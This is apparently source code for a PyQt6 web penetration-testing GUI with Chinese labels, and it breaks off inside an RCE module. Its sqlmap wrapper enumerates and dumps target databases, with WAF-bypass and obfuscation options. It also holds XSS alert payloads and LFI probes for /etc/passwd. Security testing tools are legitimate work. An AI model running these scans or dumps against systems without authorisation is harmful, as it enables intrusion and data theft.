from . import register_module
from gui.widgets.base_module import BaseModuleWidget, LogLevel
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QComboBox, QCheckBox, QSpinBox, QGroupBox,
    QFormLayout, QTextEdit, QTableWidget, QTableWidgetItem,
    QHeaderView, QProgressBar, QFileDialog, QMessageBox,
    QListWidget, QListWidgetItem, QDialog, QDialogButtonBox,
    QSplitter, QFrame, QTabWidget
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
import subprocess
import threading
import re
import os
import json


class SQLMapWorker(QThread):
    output_received = pyqtSignal(str)
    finished_signal = pyqtSignal(dict)
    
    def __init__(self, sqlmap_path, target, args):
        super().__init__()
        self._sqlmap_path = sqlmap_path
        self._target = target
        self._args = args
        self._is_cancelled = False
        self._result = {"success": False, "data": None, "output": ""}
    
    def run(self):
        cmd = [self._sqlmap_path] + self._args
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            output_lines = []
            while True:
                if self._is_cancelled:
                    process.terminate()
                    break
                
                line = process.stdout.readline()
                if not line:
                    if process.poll() is not None:
                        break
                    continue
                
                line = line.rstrip()
                output_lines.append(line)
                self.output_received.emit(line)
            
            output = "\n".join(output_lines)
            self._result["output"] = output
            self._result["success"] = process.returncode == 0
            self.finished_signal.emit(self._result)
            
        except Exception as e:
            self._result["output"] = str(e)
            self.finished_signal.emit(self._result)
    
    def cancel(self):
        self._is_cancelled = True


class TableSelectDialog(QDialog):
    def __init__(self, tables, parent=None):
        super().__init__(parent)
        self.setWindowTitle("选择要注入的表")
        self.setMinimumSize(400, 500)
        self._tables = tables
        self._setup_ui()
    
    def _setup_ui(self):
        layout = QVBoxLayout(self)
        
        label = QLabel("请选择要注入的表（可多选）:")
        layout.addWidget(label)
        
        self._list_widget = QListWidget()
        self._list_widget.setSelectionMode(QListWidget.SelectionMode.MultiSelection)
        for table in self._tables:
            item = QListWidgetItem(table)
            self._list_widget.addItem(item)
        layout.addWidget(self._list_widget)
        
        btn_layout = QHBoxLayout()
        
        select_all_btn = QPushButton("全选")
        select_all_btn.clicked.connect(self._list_widget.selectAll)
        btn_layout.addWidget(select_all_btn)
        
        clear_btn = QPushButton("清除")
        clear_btn.clicked.connect(self._list_widget.clearSelection)
        btn_layout.addWidget(clear_btn)
        
        layout.addLayout(btn_layout)
        
        buttons = QDialogButtonBox(
            QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel
        )
        buttons.accepted.connect(self.accept)
        buttons.rejected.connect(self.reject)
        layout.addWidget(buttons)
    
    def get_selected_tables(self):
        return [item.text() for item in self._list_widget.selectedItems()]


class ColumnSelectDialog(QDialog):
    def __init__(self, columns, parent=None):
        super().__init__(parent)
        self.setWindowTitle("选择要注入的列")
        self.setMinimumSize(400, 500)
        self._columns = columns
        self._setup_ui()
    
    def _setup_ui(self):
        layout = QVBoxLayout(self)
        
        label = QLabel("请选择要注入的列（可多选）:")
        layout.addWidget(label)
        
        self._list_widget = QListWidget()
        self._list_widget.setSelectionMode(QListWidget.SelectionMode.MultiSelection)
        for column in self._columns:
            item = QListWidgetItem(column)
            self._list_widget.addItem(item)
        layout.addWidget(self._list_widget)
        
        btn_layout = QHBoxLayout()
        
        select_all_btn = QPushButton("全选")
        select_all_btn.clicked.connect(self._list_widget.selectAll)
        btn_layout.addWidget(select_all_btn)
        
        clear_btn = QPushButton("清除")
        clear_btn.clicked.connect(self._list_widget.clearSelection)
        btn_layout.addWidget(clear_btn)
        
        layout.addLayout(btn_layout)
        
        buttons = QDialogButtonBox(
            QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel
        )
        buttons.accepted.connect(self.accept)
        buttons.rejected.connect(self.reject)
        layout.addWidget(buttons)
    
    def get_selected_columns(self):
        return [item.text() for item in self._list_widget.selectedItems()]


@register_module("sqli")
class SQLiScannerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("sqli", "SQL注入")
        self._current_db = None
        self._current_table = None
        self._databases = []
        self._tables = []
        self._columns = {}
        self._worker = None
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        tabs = QTabWidget()
        
        basic_tab = QWidget()
        basic_layout = QVBoxLayout(basic_tab)
        
        options_group = QGroupBox("SQLMap基本选项")
        form_layout = QFormLayout(options_group)
        
        self._level_spin = QSpinBox()
        self._level_spin.setRange(1, 5)
        self._level_spin.setValue(1)
        form_layout.addRow("测试等级:", self._level_spin)
        
        self._risk_spin = QSpinBox()
        self._risk_spin.setRange(1, 3)
        self._risk_spin.setValue(1)
        form_layout.addRow("风险等级:", self._risk_spin)
        
        self._technique_combo = QComboBox()
        self._setup_combo(self._technique_combo, [
            "全部技术", "布尔盲注(B)", "时间盲注(T)", "报错注入(E)", "联合查询(U)", "堆叠查询(S)"
        ])
        form_layout.addRow("注入技术:", self._technique_combo)
        
        self._dbms_combo = QComboBox()
        self._setup_combo(self._dbms_combo, [
            "自动检测", "MySQL", "PostgreSQL", "MSSQL", "Oracle", "SQLite"
        ])
        form_layout.addRow("数据库类型:", self._dbms_combo)
        
        self._tamper_combo = QComboBox()
        self._setup_combo(self._tamper_combo, [
            "无", "space2comment", "between", "charencode", "base64encode",
            "equaltolike", "randomcase", "spassword", "versionedkeywords"
        ])
        form_layout.addRow("混淆脚本:", self._tamper_combo)
        
        self._randomAgent_check = QCheckBox("随机User-Agent")
        self._randomAgent_check.setChecked(True)
        form_layout.addRow(self._randomAgent_check)
        
        self._threads_spin = QSpinBox()
        self._threads_spin.setRange(1, 10)
        self._threads_spin.setValue(1)
        form_layout.addRow("并发线程:", self._threads_spin)
        
        basic_layout.addWidget(options_group)
        
        db_group = QGroupBox("数据库信息")
        db_layout = QVBoxLayout(db_group)
        
        db_info_layout = QHBoxLayout()
        db_info_layout.addWidget(QLabel("当前数据库:"))
        self._db_label = QLabel("未选择")
        self._db_label.setStyleSheet("font-weight: bold; color: #4285F4;")
        db_info_layout.addWidget(self._db_label)
        db_info_layout.addStretch()
        db_layout.addLayout(db_info_layout)
        
        table_info_layout = QHBoxLayout()
        table_info_layout.addWidget(QLabel("当前表:"))
        self._table_label = QLabel("未选择")
        self._table_label.setStyleSheet("font-weight: bold; color: #4285F4;")
        table_info_layout.addWidget(self._table_label)
        table_info_layout.addStretch()
        db_layout.addLayout(table_info_layout)
        
        basic_layout.addWidget(db_group)
        tabs.addTab(basic_tab, "基本选项")
        
        request_tab = QWidget()
        request_layout = QVBoxLayout(request_tab)
        
        request_group = QGroupBox("请求选项")
        request_form = QFormLayout(request_group)
        
        self._cookie_input = QLineEdit()
        self._cookie_input.setPlaceholderText("Cookie值，如: PHPSESSID=abc123")
        request_form.addRow("Cookie:", self._cookie_input)
        
        self._user_agent_input = QLineEdit()
        self._user_agent_input.setPlaceholderText("自定义User-Agent")
        request_form.addRow("User-Agent:", self._user_agent_input)
        
        self._referer_input = QLineEdit()
        self._referer_input.setPlaceholderText("Referer头")
        request_form.addRow("Referer:", self._referer_input)
        
        self._host_input = QLineEdit()
        self._host_input.setPlaceholderText("Host头")
        request_form.addRow("Host:", self._host_input)
        
        headers_layout = QHBoxLayout()
        self._headers_input = QLineEdit()
        self._headers_input.setPlaceholderText("自定义头，如: X-Forwarded-For: 127.0.0.1")
        headers_layout.addWidget(self._headers_input)
        request_form.addRow("自定义头:", headers_layout)
        
        request_layout.addWidget(request_group)
        
        method_group = QGroupBox("请求方法")
        method_form = QFormLayout(method_group)
        
        self._method_combo = QComboBox()
        self._setup_combo(self._method_combo, ["GET", "POST", "PUT", "PATCH"])
        method_form.addRow("请求方法:", self._method_combo)
        
        self._data_input = QTextEdit()
        self._data_input.setPlaceholderText("POST数据，如: username=admin&password=test")
        self._data_input.setMaximumHeight(80)
        method_form.addRow("POST数据:", self._data_input)
        
        self._contentType_combo = QComboBox()
        self._setup_combo(self._contentType_combo, [
            "application/x-www-form-urlencoded", "application/json", "multipart/form-data", "text/xml"
        ])
        method_form.addRow("Content-Type:", self._contentType_combo)
        
        request_layout.addWidget(method_group)
        request_layout.addStretch()
        tabs.addTab(request_tab, "请求选项")
        
        network_tab = QWidget()
        network_layout = QVBoxLayout(network_tab)
        
        network_group = QGroupBox("网络选项")
        network_form = QFormLayout(network_group)
        
        self._proxy_input = QLineEdit()
        self._proxy_input.setPlaceholderText("代理地址，如: http://127.0.0.1:8080")
        network_form.addRow("代理:", self._proxy_input)
        
        self._proxyFile_input = QLineEdit()
        self._proxyFile_input.setPlaceholderText("代理列表文件")
        proxyFile_btn = QPushButton("选择")
        proxyFile_btn.setFixedWidth(60)
        proxyFile_btn.clicked.connect(self._select_proxy_file)
        proxyFile_layout = QHBoxLayout()
        proxyFile_layout.addWidget(self._proxyFile_input)
        proxyFile_layout.addWidget(proxyFile_btn)
        network_form.addRow("代理列表:", proxyFile_layout)
        
        self._timeout_spin = QSpinBox()
        self._timeout_spin.setRange(1, 120)
        self._timeout_spin.setValue(30)
        self._timeout_spin.setSuffix(" 秒")
        network_form.addRow("超时时间:", self._timeout_spin)
        
        self._delay_spin = QSpinBox()
        self._delay_spin.setRange(0, 10)
        self._delay_spin.setValue(0)
        self._delay_spin.setSuffix(" 秒")
        network_form.addRow("请求延迟:", self._delay_spin)
        
        self._retries_spin = QSpinBox()
        self._retries_spin.setRange(0, 10)
        self._retries_spin.setValue(3)
        network_form.addRow("重试次数:", self._retries_spin)
        
        self._forceSSL_check = QCheckBox("强制SSL")
        network_form.addRow(self._forceSSL_check)
        
        self._ignoreProxy_check = QCheckBox("忽略系统代理")
        network_form.addRow(self._ignoreProxy_check)
        
        network_layout.addWidget(network_group)
        network_layout.addStretch()
        tabs.addTab(network_tab, "网络选项")
        
        advanced_tab = QWidget()
        advanced_layout = QVBoxLayout(advanced_tab)
        
        advanced_group = QGroupBox("高级选项")
        advanced_form = QFormLayout(advanced_group)
        
        self._prefix_input = QLineEdit()
        self._prefix_input.setPlaceholderText("注入payload前缀")
        advanced_form.addRow("Payload前缀:", self._prefix_input)
        
        self._suffix_input = QLineEdit()
        self._suffix_input.setPlaceholderText("注入payload后缀")
        advanced_form.addRow("Payload后缀:", self._suffix_input)
        
        self._dbmsCred_input = QLineEdit()
        self._dbmsCred_input.setPlaceholderText("如: user:password")
        advanced_form.addRow("数据库凭据:", self._dbmsCred_input)
        
        self._os_combo = QComboBox()
        self._setup_combo(self._os_combo, ["自动检测", "Windows", "Linux"])
        advanced_form.addRow("目标系统:", self._os_combo)
        
        self._secondOrder_input = QLineEdit()
        self._secondOrder_input.setPlaceholderText("二阶注入URL")
        advanced_form.addRow("二阶注入:", self._secondOrder_input)
        
        self._skipWaf_check = QCheckBox("尝试绕过WAF")
        advanced_form.addRow(self._skipWaf_check)
        
        self._identifyWaf_check = QCheckBox("识别WAF")
        advanced_form.addRow(self._identifyWaf_check)
        
        self._mobile_check = QCheckBox("模拟移动端")
        advanced_form.addRow(self._mobile_check)
        
        advanced_layout.addWidget(advanced_group)
        advanced_layout.addStretch()
        tabs.addTab(advanced_tab, "高级选项")
        
        layout.addWidget(tabs)
        
        action_group = QGroupBox("操作步骤")
        action_layout = QVBoxLayout(action_group)
        
        btn_row1 = QHBoxLayout()
        self._get_dbs_btn = QPushButton("1. 获取数据库")
        self._get_dbs_btn.clicked.connect(self._get_databases)
        btn_row1.addWidget(self._get_dbs_btn)
        
        self._get_tables_btn = QPushButton("2. 获取表名")
        self._get_tables_btn.clicked.connect(self._get_tables)
        self._get_tables_btn.setEnabled(False)
        btn_row1.addWidget(self._get_tables_btn)
        action_layout.addLayout(btn_row1)
        
        btn_row2 = QHBoxLayout()
        self._get_columns_btn = QPushButton("3. 获取列名")
        self._get_columns_btn.clicked.connect(self._get_columns)
        self._get_columns_btn.setEnabled(False)
        btn_row2.addWidget(self._get_columns_btn)
        
        self._dump_data_btn = QPushButton("4. 获取数据")
        self._dump_data_btn.clicked.connect(self._dump_data)
        self._dump_data_btn.setEnabled(False)
        btn_row2.addWidget(self._dump_data_btn)
        action_layout.addLayout(btn_row2)
        
        layout.addWidget(action_group)
        
        return widget
    
    def _select_proxy_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "选择代理列表文件", "", "文本文件 (*.txt);;所有文件 (*)"
        )
        if file_path:
            self._proxyFile_input.setText(file_path)
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["数据库", "表名", "列名", "数据预览"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _get_sqlmap_path(self):
        if self._is_tool_available("sqlmap"):
            return self._get_tool_path("sqlmap")
        return None
    
    def _build_base_args(self, target: str) -> list:
        args = [
            "-u", target,
            f"--level={self._level_spin.value()}",
            f"--risk={self._risk_spin.value()}",
            "--batch",
        ]
        
        if self._randomAgent_check.isChecked():
            args.append("--random-agent")
        
        threads = self._threads_spin.value()
        if threads > 1:
            args.append(f"--threads={threads}")
        
        dbms_map = {
            "MySQL": "mysql",
            "PostgreSQL": "postgresql",
            "MSSQL": "mssql",
            "Oracle": "oracle",
            "SQLite": "sqlite"
        }
        dbms_text = self._dbms_combo.currentText()
        if dbms_text in dbms_map:
            args.extend(["--dbms", dbms_map[dbms_text]])
        
        technique_map = {
            "布尔盲注(B)": "B",
            "时间盲注(T)": "T",
            "报错注入(E)": "E",
            "联合查询(U)": "U",
            "堆叠查询(S)": "S"
        }
        tech_text = self._technique_combo.currentText()
        if tech_text in technique_map:
            args.extend(["--technique", technique_map[tech_text]])
        
        tamper = self._tamper_combo.currentText()
        if tamper != "无":
            args.extend(["--tamper", tamper])
        
        cookie = self._cookie_input.text().strip()
        if cookie:
            args.extend(["--cookie", cookie])
        
        user_agent = self._user_agent_input.text().strip()
        if user_agent:
            args.extend(["--user-agent", user_agent])
        
        referer = self._referer_input.text().strip()
        if referer:
            args.extend(["--referer", referer])
        
        host = self._host_input.text().strip()
        if host:
            args.extend(["--host", host])
        
        headers = self._headers_input.text().strip()
        if headers:
            args.extend(["--headers", headers])
        
        method = self._method_combo.currentText()
        if method != "GET":
            args.extend(["--method", method])
        
        post_data = self._data_input.toPlainText().strip()
        if post_data:
            args.extend(["--data", post_data])
        
        content_type = self._contentType_combo.currentText()
        if content_type != "application/x-www-form-urlencoded":
            args.extend(["--content-type", content_type])
        
        proxy = self._proxy_input.text().strip()
        if proxy:
            args.extend(["--proxy", proxy])
        
        proxy_file = self._proxyFile_input.text().strip()
        if proxy_file:
            args.extend(["--proxy-file", proxy_file])
        
        args.extend(["--timeout", str(self._timeout_spin.value())])
        
        delay = self._delay_spin.value()
        if delay > 0:
            args.extend(["--delay", str(delay)])
        
        retries = self._retries_spin.value()
        if retries != 3:
            args.extend(["--retries", str(retries)])
        
        if self._forceSSL_check.isChecked():
            args.append("--force-ssl")
        
        if self._ignoreProxy_check.isChecked():
            args.append("--ignore-proxy")
        
        prefix = self._prefix_input.text().strip()
        if prefix:
            args.extend(["--prefix", prefix])
        
        suffix = self._suffix_input.text().strip()
        if suffix:
            args.extend(["--suffix", suffix])
        
        dbms_cred = self._dbmsCred_input.text().strip()
        if dbms_cred:
            args.extend(["--dbms-cred", dbms_cred])
        
        os_text = self._os_combo.currentText()
        if os_text != "自动检测":
            args.extend(["--os", os_text.lower()])
        
        second_order = self._secondOrder_input.text().strip()
        if second_order:
            args.extend(["--second-url", second_order])
        
        if self._skipWaf_check.isChecked():
            args.append("--skip-waf")
        
        if self._identifyWaf_check.isChecked():
            args.append("--identify-waf")
        
        if self._mobile_check.isChecked():
            args.append("--mobile")
        
        return args
    
    def _get_databases(self):
        target = self._target_input.text().strip()
        if not target:
            self._add_log(LogLevel.ERROR, "请输入目标URL")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        sqlmap_path = self._get_sqlmap_path()
        if not sqlmap_path:
            self._add_log(LogLevel.ERROR, "SQLMap未配置，请先在工具管理中配置")
            return
        
        self._add_log(LogLevel.INFO, f"正在获取数据库列表: {target}")
        
        args = self._build_base_args(target)
        args.append("--dbs")
        args.append("--threads=5")
        
        self._worker = SQLMapWorker(sqlmap_path, target, args)
        self._worker.output_received.connect(self._on_output)
        self._worker.finished_signal.connect(self._on_dbs_finished)
        self._worker.start()
        
        self._get_dbs_btn.setEnabled(False)
    
    def _on_dbs_finished(self, result):
        self._get_dbs_btn.setEnabled(True)
        
        if result["success"]:
            output = result["output"]
            dbs = self._parse_databases(output)
            
            if dbs:
                self._databases = dbs
                self._add_log(LogLevel.SUCCESS, f"发现 {len(dbs)} 个数据库: {', '.join(dbs)}")
                
                db_dialog = QDialog(self)
                db_dialog.setWindowTitle("选择数据库")
                db_dialog.setMinimumSize(300, 400)
                
                layout = QVBoxLayout(db_dialog)
                layout.addWidget(QLabel("请选择要注入的数据库:"))
                
                db_list = QListWidget()
                for db in dbs:
                    db_list.addItem(db)
                layout.addWidget(db_list)
                
                def on_select():
                    if db_list.currentItem():
                        self._current_db = db_list.currentItem().text()
                        self._db_label.setText(self._current_db)
                        self._get_tables_btn.setEnabled(True)
                        self._add_log(LogLevel.INFO, f"已选择数据库: {self._current_db}")
                        db_dialog.accept()
                
                select_btn = QPushButton("选择")
                select_btn.clicked.connect(on_select)
                layout.addWidget(select_btn)
                
                db_dialog.exec()
            else:
                self._add_log(LogLevel.WARNING, "未找到数据库，可能需要更高的level或risk")
        else:
            self._add_log(LogLevel.ERROR, "获取数据库失败")
    
    def _parse_databases(self, output: str) -> list:
        dbs = []
        lines = output.split('\n')
        in_db_section = False
        
        for line in lines:
            if 'available databases' in line.lower():
                in_db_section = True
                continue
            
            if in_db_section:
                match = re.search(r'\[\*\]\s+(\S+)', line)
                if match:
                    dbs.append(match.group(1))
                elif line.strip() and not line.startswith('['):
                    break
        
        return dbs
    
    def _get_tables(self):
        if not self._current_db:
            self._add_log(LogLevel.ERROR, "请先选择数据库")
            return
        
        target = self._target_input.text().strip()
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        sqlmap_path = self._get_sqlmap_path()
        if not sqlmap_path:
            return
        
        self._add_log(LogLevel.INFO, f"正在获取数据库 {self._current_db} 的表名...")
        
        args = self._build_base_args(target)
        args.extend(["-D", self._current_db, "--tables", "--threads=5"])
        
        self._worker = SQLMapWorker(sqlmap_path, target, args)
        self._worker.output_received.connect(self._on_output)
        self._worker.finished_signal.connect(self._on_tables_finished)
        self._worker.start()
        
        self._get_tables_btn.setEnabled(False)
    
    def _on_tables_finished(self, result):
        self._get_tables_btn.setEnabled(True)
        
        if result["success"]:
            output = result["output"]
            tables = self._parse_tables(output)
            
            if tables:
                self._tables = tables
                self._add_log(LogLevel.SUCCESS, f"发现 {len(tables)} 个表: {', '.join(tables)}")
                
                dialog = TableSelectDialog(tables, self)
                if dialog.exec():
                    selected = dialog.get_selected_tables()
                    if selected:
                        self._current_table = selected
                        self._table_label.setText(", ".join(selected[:3]) + ("..." if len(selected) > 3 else ""))
                        self._get_columns_btn.setEnabled(True)
                        self._dump_data_btn.setEnabled(True)
                        self._add_log(LogLevel.INFO, f"已选择 {len(selected)} 个表")
            else:
                self._add_log(LogLevel.WARNING, "未找到表")
        else:
            self._add_log(LogLevel.ERROR, "获取表名失败")
    
    def _parse_tables(self, output: str) -> list:
        tables = []
        lines = output.split('\n')
        in_table_section = False
        
        for line in lines:
            if 'database:' in line.lower() and self._current_db.lower() in line.lower():
                in_table_section = True
                continue
            
            if in_table_section:
                match = re.search(r'\[\*\]\s+(\S+)', line)
                if match:
                    tables.append(match.group(1))
                elif line.strip() and not line.startswith('[') and not line.startswith('|'):
                    if '---' in line or not line.strip():
                        continue
        
        return tables
    
    def _get_columns(self):
        if not self._current_db or not self._current_table:
            self._add_log(LogLevel.ERROR, "请先选择数据库和表")
            return
        
        target = self._target_input.text().strip()
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        sqlmap_path = self._get_sqlmap_path()
        if not sqlmap_path:
            return
        
        self._add_log(LogLevel.INFO, f"正在获取列名...")
        
        args = self._build_base_args(target)
        args.extend(["-D", self._current_db, "--columns", "--threads=5"])
        
        self._worker = SQLMapWorker(sqlmap_path, target, args)
        self._worker.output_received.connect(self._on_output)
        self._worker.finished_signal.connect(self._on_columns_finished)
        self._worker.start()
        
        self._get_columns_btn.setEnabled(False)
    
    def _on_columns_finished(self, result):
        self._get_columns_btn.setEnabled(True)
        
        if result["success"]:
            output = result["output"]
            columns = self._parse_columns(output)
            
            if columns:
                self._columns = columns
                all_columns = []
                for table, cols in columns.items():
                    all_columns.extend(cols)
                
                self._add_log(LogLevel.SUCCESS, f"发现列: {', '.join(all_columns[:10])}{'...' if len(all_columns) > 10 else ''}")
                
                dialog = ColumnSelectDialog(all_columns, self)
                if dialog.exec():
                    selected = dialog.get_selected_columns()
                    if selected:
                        self._selected_columns = selected
                        self._add_log(LogLevel.INFO, f"已选择 {len(selected)} 个列: {', '.join(selected)}")
            else:
                self._add_log(LogLevel.WARNING, "未找到列")
        else:
            self._add_log(LogLevel.ERROR, "获取列名失败")
    
    def _parse_columns(self, output: str) -> dict:
        columns = {}
        lines = output.split('\n')
        current_table = None
        
        for line in lines:
            table_match = re.search(r'Database:\s*\S+\s+Table:\s*(\S+)', line)
            if table_match:
                current_table = table_match.group(1)
                columns[current_table] = []
                continue
            
            if current_table:
                col_match = re.search(r'\|\s*(\S+)\s*\|', line)
                if col_match and col_match.group(1) not in ['Column', 'Type']:
                    columns[current_table].append(col_match.group(1))
        
        return columns
    
    def _dump_data(self):
        if not self._current_db or not self._current_table:
            self._add_log(LogLevel.ERROR, "请先选择数据库和表")
            return
        
        target = self._target_input.text().strip()
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        sqlmap_path = self._get_sqlmap_path()
        if not sqlmap_path:
            return
        
        self._add_log(LogLevel.INFO, f"正在获取数据...")
        
        args = self._build_base_args(target)
        args.extend(["-D", self._current_db])
        
        if hasattr(self, '_selected_columns') and self._selected_columns:
            for table in self._current_table:
                args.extend(["-T", table, "--dump", "--threads=5"])
        else:
            for table in self._current_table:
                args.extend(["-T", table, "--dump", "--threads=5"])
        
        self._worker = SQLMapWorker(sqlmap_path, target, args)
        self._worker.output_received.connect(self._on_output)
        self._worker.finished_signal.connect(self._on_dump_finished)
        self._worker.start()
        
        self._dump_data_btn.setEnabled(False)
    
    def _on_dump_finished(self, result):
        self._dump_data_btn.setEnabled(True)
        
        if result["success"]:
            output = result["output"]
            self._parse_dump_data(output)
            self._add_log(LogLevel.SUCCESS, "数据获取完成，请查看结果表格")
        else:
            self._add_log(LogLevel.ERROR, "获取数据失败")
    
    def _parse_dump_data(self, output: str):
        lines = output.split('\n')
        data_rows = []
        current_table = None
        headers = []
        
        for line in lines:
            table_match = re.search(r'Database:\s*\S+\s+Table:\s*(\S+)', line)
            if table_match:
                current_table = table_match.group(1)
                continue
            
            if '|' in line and current_table:
                parts = [p.strip() for p in line.split('|') if p.strip()]
                if parts and not all(c in '-+' for c in parts[0]):
                    if not headers:
                        headers = parts
                    else:
                        data_rows.append({
                            'db': self._current_db,
                            'table': current_table,
                            'columns': ', '.join(headers[:3]),
                            'data': ', '.join(str(p)[:50] for p in parts[:3])
                        })
        
        self._result_table.setRowCount(len(data_rows))
        for row, data in enumerate(data_rows):
            self._result_table.setItem(row, 0, QTableWidgetItem(data['db']))
            self._result_table.setItem(row, 1, QTableWidgetItem(data['table']))
            self._result_table.setItem(row, 2, QTableWidgetItem(data['columns']))
            self._result_table.setItem(row, 3, QTableWidgetItem(data['data']))
    
    def _on_output(self, line: str):
        if 'injectable' in line.lower() or 'vulnerable' in line.lower():
            self._add_log(LogLevel.SUCCESS, line)
        elif 'error' in line.lower():
            self._add_log(LogLevel.ERROR, line)
        elif 'warning' in line.lower():
            self._add_log(LogLevel.WARNING, line)
    
    def _do_scan(self):
        self._get_databases()
    
    def stop_scan(self):
        if self._worker:
            self._worker.cancel()
        super().stop_scan()


@register_module("xss")
class XSSScannerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("xss", "XSS跨站脚本")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("扫描选项")
        form_layout = QFormLayout(options_group)
        
        self._scan_type_combo = QComboBox()
        self._setup_combo(self._scan_type_combo, [
            "反射型XSS", "存储型XSS", "DOM型XSS", "全部类型"
        ])
        form_layout.addRow("扫描类型:", self._scan_type_combo)
        
        self._blind_xss_check = QCheckBox("盲测XSS")
        form_layout.addRow(self._blind_xss_check)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["参数", "注入类型", "Payload", "证据"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        import requests
        target = self._target_input.text().strip()
        if not target:
            self._add_log(LogLevel.ERROR, "请输入目标URL")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self._add_log(LogLevel.INFO, f"开始XSS扫描: {target}")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
        ]
        
        for payload in payloads:
            if not self._is_scanning:
                break
            
            try:
                test_url = target + payload if '?' in target else target + "?q=" + payload
                resp = requests.get(test_url, timeout=10, verify=False)
                
                if payload in resp.text:
                    self._add_result("GET参数", "反射型XSS", payload, "Payload在响应中")
                    self._add_log(LogLevel.SUCCESS, f"发现XSS: {payload}")
            except:
                pass
        
        self._add_log(LogLevel.INFO, "XSS扫描完成")


@register_module("lfi")
class LFIScannerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("lfi", "本地文件包含")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("扫描选项")
        form_layout = QFormLayout(options_group)
        
        self._os_combo = QComboBox()
        self._setup_combo(self._os_combo, ["自动检测", "Linux", "Windows"])
        form_layout.addRow("目标系统:", self._os_combo)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["参数", "文件路径", "类型", "内容预览"])
        table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        table.setAlternatingRowColors(True)
        table.setMinimumHeight(200)
        
        header = table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        
        return table
    
    def _do_scan(self):
        import requests
        target = self._target_input.text().strip()
        if not target:
            self._add_log(LogLevel.ERROR, "请输入目标URL")
            return
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        self._add_log(LogLevel.INFO, f"开始LFI扫描: {target}")
        
        payloads = [
            "/etc/passwd",
            "/etc/passwd%00",
            "C:/Windows/System32/drivers/etc/hosts",
        ]
        
        for payload in payloads:
            if not self._is_scanning:
                break
            
            try:
                test_url = target + payload if '?' in target else target + "?file=" + payload
                resp = requests.get(test_url, timeout=10, verify=False)
                
                if 'root:' in resp.text.lower() or 'hosts' in resp.text.lower():
                    self._add_result("file参数", payload, "LFI", resp.text[:100])
                    self._add_log(LogLevel.SUCCESS, f"发现LFI: {payload}")
            except:
                pass
        
        self._add_log(LogLevel.INFO, "LFI扫描完成")


@register_module("rce")
class RCEScannerWidget(BaseModuleWidget):
    def __init__(self):
        super().__init__("rce", "远程代码执行")
    
    def _create_options_widget(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        
        options_group = QGroupBox("扫描选项")
        form_layout = QFormLayout(options_group)
        
        self._os_combo = QComboBox()
        self._setup_combo(self._os_combo, ["自动检测", "Linux", "Windows"])
        form_layout.addRow("目标系统:", self._os_combo)
        
        layout.addWidget(options_group)
        return widget
    
    def _create_result_table(self) -> QTableWidget:
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["参数", "注入类型", "Payload", "证据"])
